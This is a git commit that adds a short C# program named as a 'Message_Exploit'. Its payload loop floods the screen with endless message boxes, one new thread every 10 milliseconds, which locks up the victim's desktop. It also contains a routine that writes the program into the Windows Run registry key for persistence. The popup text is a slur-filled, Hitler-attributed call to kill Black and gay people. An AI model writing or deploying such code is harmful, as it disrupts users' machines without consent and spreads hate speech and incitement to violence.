bcc039927b24c4cf79661e7a51e33d1f61baa904
Timmy <86867555+T1mwy@users.noreply.github.com>
2023-02-18 11:51:36 +0700

    Add files via upload

---
+++ Spamming.cs
@@ -0,0 +1,41 @@
+﻿using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Threading;
+
+namespace Message_Exploit
+{
+    class Spamming
+    {
+        static void Main()
+        {
+            Spamming sc = new Spamming();
+            Thread thread = new Thread(sc.Payload);
+            thread.Start();
+        }
+        private void RegisterInStartup(bool isChecked)
+        {
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            if (isChecked)
+            {
+                registryKey.SetValue("Loader", Application.ExecutablePath);
+            }
+            else
+            {
+                registryKey.DeleteValue("Loader");
+            }
+        }
+        public void Messages_Box()
+        {
+            MessageBox.Show("I Hate NIGGER AND GAY , KILL ALL NIGGER!!!", "Message of Hitler", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+        public void Payload()
+        {
+            while (true)
+            {
+                Thread MS = new Thread(Messages_Box);
+                MS.Start();
+                Thread.Sleep(10);
+            }
+        }
+    }
+}
